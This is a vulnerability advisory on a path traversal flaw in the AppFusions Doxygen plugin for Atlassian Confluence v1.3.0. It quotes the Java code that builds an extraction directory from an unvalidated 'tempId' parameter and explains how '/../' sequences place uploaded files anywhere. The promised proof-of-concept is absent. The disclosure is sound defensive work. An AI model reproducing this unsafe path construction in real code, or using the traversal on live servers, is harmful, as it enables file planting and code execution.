1. ADVISORY INFORMATION
=======================
Product:        AppFusions Doxygen for Atlassian Confluence
Vendor URL:     www.appfusions.com
Type:           Path Traversal [CWE-22]
Date found:     2016-06-23
Date published: -
CVSSv3 Score:   6.3 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)
CVE:            -


2. CREDITS
==========
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.


3. VERSIONS AFFECTED
====================
AppFusions Doxygen for Atlassian Confluence v1.3.0
older versions may be affected too.


4. INTRODUCTION
===============
With Doxygen in Confluence, you can embed full-structure code documentation:
-Doxygen blueprint in Confluence to allow Doxygen archive imports
-Display documentation from annotated sources such as Java (i.e., JavaDoc),
 C++, Objective-C, C#, C, PHP, Python, IDL (Corba, Microsoft, and
UNO/OpenOffice
 flavors), Fortran, VHDL, Tcl, D in Confluence.
-Navigation supports code structure (classes, hierarchies, files), element
 dependencies, inheritance and collaboration diagrams.
-Search documentation from within Confluence
-Restrict access to who can see/add what
-Doxygen in JIRA also available

(from the vendor's homepage)


5. VULNERABILITY DETAILS
========================
The application offers the functionality to import zipped Doxygen
documentations via a file upload to make them available within a
Confluence page. However the application does not properly validate the
"tempId" parameter, which represents the directory where the contents of
the uploaded file will be extracted and stored to. This leads to a path
traversal vulnerability when "/../" sequences are used as part of the
"tempId" parameter. Since the contents of the uploaded file are
extracted to the traversed directory, this vulnerability could also lead
to Remote Code Execution.

In DoxygenUploadServlet.java (lines 63-64) the "tempId" parameter is
read as part of a GET request to "/plugins/servlet/doxygen/upload" and
afterwards used in a "getTemporaryDirectory()" call:

String tempId = request.getParameter("tempId");
String destination =
this.doxygenManager.getTemporaryDirectory(tempId).getAbsolutePath();

The "getTemporaryDirectory()" function is defined in
DefaultDoxyGenManager.java (lines 38-41) and constructs a file object
based on the "java.io.tmpdir" variable, the static string
"/doxygen-temp/", the user-supplied "tempId" and a file separator in
between all parts:

public File getTemporaryDirectory(String tempId) {
    File file = new File(System.getProperty("java.io.tmpdir") +
File.separator + "doxygen-temp" + File.separator + tempId);
    return file;
}

In the subsequent code the uploaded file as represented by the "file"
HTTP POST parameter to "/plugins/servlet/doxygen/upload" is extracted to
the directory which was built using the "file" object.

The following Proof-of-Concept triggers this vulnerability by uploading
a zipped file, which will be extracted to "/home/confluence" by the
application:

6. RISK
=======
To successfully exploit this vulnerability the attacker must be
authenticated and must have the rights within Atlassian Confluence to
upload Doxygen files (default).

The vulnerability allows remote attackers to upload arbitrary files to
any destination directory writeable by the user of the web server, which
could lead to Remote Code Execution.


7. SOLUTION
===========
Update to AppFusions Doxygen for Atlassian Confluence v1.3.4
